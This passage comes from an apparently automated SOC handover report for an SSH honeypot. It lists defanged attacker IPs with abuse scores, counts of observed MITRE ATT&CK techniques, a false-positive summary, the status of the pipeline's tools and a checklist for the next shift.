| `64.227.109[.]89` | US | DigitalOcean, LLC | **100** ⚠️ | 30 |
| `34.78.29[.]97` | BE | Google LLC | **100** ⚠️ | 50 |
| `103.191.165[.]66` | ID | PT Sakti Wijaya Network | **100** ⚠️ | 9 |
| `180.76.141[.]1` | CN | Beijing Baidu Netcom Science and Technology Co., Ltd. | **100** ⚠️ | 50 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 219 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 139 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 71 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 36 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 36 |

---

## 🔕 False Positive Summary (12 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 3 |
| AbuseIPDB score 13 below threshold 25 | 1 |
| AbuseIPDB score 14 below threshold 25 | 1 |
| AbuseIPDB score 15 below threshold 25 | 1 |
| AbuseIPDB score 4 below threshold 25 | 1 |
| AbuseIPDB score 5 below threshold 25 | 2 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 3 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 274 cases |
| Tool 34  | Credential Extractor        | ✅ 210 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 3 fingerprints |
| Tool 36  | Command Clustering          | ✅ 2 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 35 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 12 filtered (4.4%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 28 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 26 files |
| Tool 33  | YARA Classifier             | ✅ 8 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 71 priority case(s) shown individually · 23 recon entry/entries in table (8 group(s) consolidating 176 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-05-03T20:51:07Z_
